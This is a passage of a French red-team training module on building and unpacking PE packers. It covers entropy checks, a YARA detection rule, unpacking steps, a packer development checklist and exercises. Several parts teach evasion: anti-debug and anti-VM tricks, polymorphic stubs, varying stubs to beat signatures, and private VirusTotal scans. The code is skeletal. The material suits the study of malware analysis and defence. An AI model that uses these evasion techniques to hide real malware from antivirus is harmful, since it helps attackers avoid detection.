# Lecture d'un PE
with open("suspect.exe", "rb") as f:
    data = f.read()

entropy = calculate_entropy(data)
print(f"Entropie : {entropy:.2f}")

# Interprétation :
# < 5.0 : Probablement non packé/chiffré
# 5.0 - 6.5 : Potentiellement compressé
# > 6.5 : Très probablement chiffré/packé
```

### 7.3 Unpacking Manuel

```
MÉTHODOLOGIE D'UNPACKING:

┌────────────────────────────────────────────────────────┐
│ ÉTAPE 1 : ANALYSE STATIQUE                            │
├────────────────────────────────────────────────────────┤
│ - Identification du packer (PEiD, Detect It Easy)     │
│ - Vérification des sections                           │
│ - Localisation de l'Entry Point                       │
└────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────┐
│ ÉTAPE 2 : ANALYSE DYNAMIQUE                           │
├────────────────────────────────────────────────────────┤
│ - Lancement dans x64dbg/OllyDbg                       │
│ - Breakpoint sur Entry Point                          │
│ - Recherche du JMP vers OEP (tail jump)               │
│   Patterns communs :                                  │
│   • JMP EAX / CALL EAX                                │
│   • PUSH + RET (indirect jump)                        │
│   • JMP [address]                                     │
└────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────┐
│ ÉTAPE 3 : DUMP DE MÉMOIRE                             │
├────────────────────────────────────────────────────────┤
│ - BP sur OEP                                          │
│ - Dump du process (Scylla / PE-bear)                  │
│ - Reconstruction de l'Import Table                    │
│ - Fix des relocations si nécessaire                   │
└────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────┐
│ ÉTAPE 4 : RECONSTRUCTION DU PE                        │
├────────────────────────────────────────────────────────┤
│ - Utilisation de Scylla IAT Autosearch                │
│ - Get Imports                                         │
│ - Fix Dump                                            │
│ - Vérification avec PEView                            │
└────────────────────────────────────────────────────────┘
```

### 7.4 Détection par EDR/AV

**Signatures YARA pour détecter les packers :**

```yara
rule Packed_Executable {
    meta:
        description = "Détecte un exécutable packé générique"
        author = "Red Team"

    strings:
        $upx1 = "UPX0" ascii
        $upx2 = "UPX1" ascii
        $themida = "Themida" ascii
        $vmprotect = "VMProtect" ascii

    condition:
        uint16(0) == 0x5A4D and  // MZ signature
        (
            any of ($upx*) or
            $themida or
            $vmprotect or
            (
                // Section RWX suspecte
                for any i in (0..pe.number_of_sections - 1):
                (
                    pe.sections[i].characteristics & 0xE0000000 == 0xE0000000
                )
            ) or
            (
                // Entropie élevée
                math.entropy(0, filesize) > 7.0
            )
        )
}
```

---

## 8. Checklist de Développement d'un Packer

### 8.1 Étapes de Développement

```
┌─────────────────────────────────────────────────────────┐
│               CHECKLIST DÉVELOPPEMENT                   │
└─────────────────────────────────────────────────────────┘

Phase 1 : Parser PE
  ☐ Lire le fichier PE en mémoire
  ☐ Parser DOS header et NT headers
  ☐ Énumérer les sections
  ☐ Extraire l'Import Table
  ☐ Sauvegarder l'Original Entry Point

Phase 2 : Compression/Chiffrement
  ☐ Choisir un algorithme (LZNT1, aPLib, LZMA)
  ☐ Compresser les sections pertinentes (.text, .data)
  ☐ Chiffrer avec XOR/RC4/AES
  ☐ Mesurer le taux de compression

Phase 3 : Stub Loader
  ☐ Écrire le code de déchiffrement
  ☐ Implémenter la décompression
  ☐ Résolution dynamique des imports
  ☐ Relocation si nécessaire
  ☐ Jump vers OEP

Phase 4 : Reconstruction PE
  ☐ Créer une nouvelle section (.packed)
  ☐ Copier le stub et le payload
  ☐ Modifier l'Entry Point
  ☐ Recalculer SizeOfImage
  ☐ Mettre à jour le nombre de sections

Phase 5 : Anti-Analyse (Optionnel)
  ☐ Anti-debugging (IsDebuggerPresent, PEB check)
  ☐ Anti-VM (CPUID, registre)
  ☐ Timing attacks
  ☐ Code obfuscation
  ☐ Polymorphisme

Phase 6 : Tests
  ☐ Exécution du PE packé
  ☐ Vérification du comportement
  ☐ Test sur Windows 7/10/11
  ☐ Test x86 et x64
  ☐ Scan AV (VirusTotal en privé)

Phase 7 : Optimisations
  ☐ Minimiser la taille du stub
  ☐ Améliorer le ratio de compression
  ☐ Réduire l'overhead d'exécution
  ☐ Randomisation (polymorphisme)
```

### 8.2 Pièges à Éviter

1. **Stub trop gros** : Plus le stub est volumineux, plus il est détectable
2. **Oublier les relocations** : Le PE peut crasher si chargé à une autre adresse
3. **Import Table cassée** : Ne pas oublier de résoudre les imports dynamiquement
4. **Permissions mémoire** : VirtualProtect pour RWX peut être détecté
5. **Signature du packer** : Varier les stubs pour éviter les signatures

---

## 9. Exercices Pratiques

### Exercice 1 : Analyse d'un PE Packé

**Objectif :** Identifier un packer et localiser l'OEP

**Fichier :** `challenge1.exe` (fourni)

**Tâches :**
1. Utiliser `PEiD` ou `Detect It Easy` pour identifier le packer
2. Analyser l'entropie des sections
3. Charger dans `x64dbg` et localiser le tail jump
4. Dumper le PE décompressé avec `Scylla`

### Exercice 2 : Implémenter un XOR Packer

**Objectif :** Créer un packer simple qui chiffre .text avec XOR

**Spécifications :**
- Langage : C
- Algorithme : XOR multi-byte (clé de 16 bytes)
- Stub : Assembly inline
- Sortie : `input.exe` → `input_packed.exe`

**Code à compléter :**

```c
// TODO: Implémenter la fonction PackWithXOR
BOOL PackWithXOR(const char* input, const char* output) {
    // 1. Charger le PE
    // 2. Extraire .text
    // 3. XOR encrypt
    // 4. Créer le stub
    // 5. Reconstruire le PE

    return TRUE;
}
```

### Exercice 3 : Unpacker Automatique

**Objectif :** Créer un script Python qui unpack automatiquement un UPX

**Indice :**
```python
import pefile
import struct

def unpack_upx(filename):
    pe = pefile.PE(filename)

    # Rechercher les sections UPX0/UPX1
    for section in pe.sections:
        if b'UPX' in section.Name:
            print(f"Section UPX trouvée : {section.Name}")
            # TODO: Extraire et décompresser

    return unpacked_data
```

### Exercice 4 : Anti-Unpacking

**Objectif :** Ajouter des protections anti-unpacking au stub

**Techniques à implémenter :**
1. Checksum du stub (détection de BP)
2. Timing check (détection de single-stepping)
3. Exception handling (SEH anti-debug)

### Exercice 5 : Packer Polymorphique

**Objectif :** Générer un stub différent à chaque exécution

**Contraintes :**
- 5 variantes de déchiffrement minimum
- Randomisation de l'ordre des instructions
- Junk code aléatoire

---

## 10. Ressources et Références

### 10.1 Outils

| Outil              | Usage                          | Lien                              |
|--------------------|--------------------------------|-----------------------------------|
| UPX                | Packer open-source             | https://upx.github.io/            |
| PEiD               | Détection de packer            | https://www.aldeid.com/wiki/PEiD  |
| Detect It Easy     | Analyse de PE moderne          | https://github.com/horsicq/DIE    |
| x64dbg             | Debugger pour unpacking        | https://x64dbg.com/               |
| Scylla             | Dump et IAT reconstruction     | https://github.com/NtQuery/Scylla |
| PE-bear            | Éditeur PE hexadécimal         | https://github.com/hasherezade/pe-bear |

### 10.2 Documentation Technique

- **Microsoft PE Format** : https://docs.microsoft.com/en-us/windows/win32/debug/pe-format
- **RtlCompressBuffer** : https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-rtlcompressbuffer
- **aPLib Compression** : http://ibsensoftware.com/products_aPLib.html

### 10.3 Lectures Recommandées

1. **"Practical Malware Analysis"** - Michael Sikorski (Chapitre 18 : Packers)
2. **"The Art of Unpacking"** - Mark Vincent Yason (BlackHat)
3. **"Anti-Unpacker Tricks"** - Peter Ferrie (Symantec)

### 10.4 Laboratoires

- **Malware Unicorn RE101/RE102** : https://malwareunicorn.org/workshops/re101.html
- **Practical Reverse Engineering Labs** : https://practicalbinaryanalysis.com/

---

## 11. Conclusion

### Points Clés à Retenir

1. **Un packer** transforme un PE pour éviter la détection et compliquer l'analyse
2. **Architecture** : Stub Loader + Payload Compressé/Chiffré
3. **Workflow** : Compression → Chiffrement → Injection du stub → Reconstruction PE
4. **Évasion** : Polymorphisme, anti-debug, anti-VM
5. **Détection** : Entropie, sections RWX, signatures connues
6. **Unpacking** : Analyse dynamique + dump mémoire + IAT reconstruction

### Limitations

- Les AVs détectent de plus en plus les comportements de packing
- L'analyse heuristique identifie les décompressions en mémoire
- Les EDRs surveillent VirtualAlloc + WriteProcessMemory + CreateRemoteThread
- Un packer custom est plus efficace mais nécessite de la maintenance

### Prochaines Étapes

Après ce module, vous devriez explorer :
- **Module W45** : Process Hollowing et Process Doppelgänging
- **Module W46** : Shellcode Loaders avancés
- **Module W47** : Crypters et stub loaders polymorphiques

---

## Références

- UPX Documentation : https://upx.github.io/
- PE Format Specification : https://learn.microsoft.com/en-us/windows/win32/debug/pe-format
- Malware Packing State of the Art : https://www.sentinelone.com/blog/malware-packing-state-art/
- OpenRCE Unpacking Tutorial : http://www.openrce.org/articles/full_view/23

---

**Auteur** : Red Team Training
**Module** : W44 - PE Packer Development
**Dernière mise à jour** : 2025-12-07
